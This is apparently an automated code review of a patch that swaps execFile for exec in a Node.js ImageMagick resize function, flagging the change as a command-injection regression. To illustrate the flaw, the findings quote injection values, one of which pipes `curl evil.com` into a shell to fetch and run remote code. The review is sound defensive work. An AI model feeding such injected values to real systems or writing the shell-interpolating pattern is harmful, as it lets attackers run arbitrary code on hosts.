findings.body:
Switching from `execFile` to `exec` interpolates caller-controlled `filter` (unquoted) and `src` (double-quoted only) into a shell. A filter such as `Lanczos; curl evil.com | sh` or a path containing `"` is executed by the shell; ImageMagick `-filter` is a single argv token and does not need a shell.

Keep `execFile` and pass the filter as an argument:

```suggestion
    execFile("convert", [src, "-filter", filter, "-resize", `${w}x`, "/tmp/out.png"], (e) => e ? rej(e) : res("/tmp/out.png"));
```

Also restore `import { execFile } from "child_process";`.

summary:
Looks good except for a critical command-injection regression: `resize` now builds a shell string from caller-supplied `filter` and `src`.

The previous `execFile` argv form already supports ImageMagick `-filter` as one argument, so a shell is not required for composed filter names. Interpolating `filter` unquoted (and `src` only double-quoted) means values such as `Lanczos; id` or a path containing `"` run as shell on the host. Restore `execFile` and pass `-filter` plus the filter string as argv entries.

The new required middle parameter also shifts the old `resize(src, w)` contract; any existing caller will treat the width as the filter and pass `undefined` into `-resize`. There are no in-repo callers to update.

**Recommendation:** request-changes

verification.reason: The patch replaces execFile argv passing with exec and interpolates unquoted filter plus only double-quoted src into a shell command, enabling command injection; base used execFile safely and ImageMagick -filter does not require a shell.
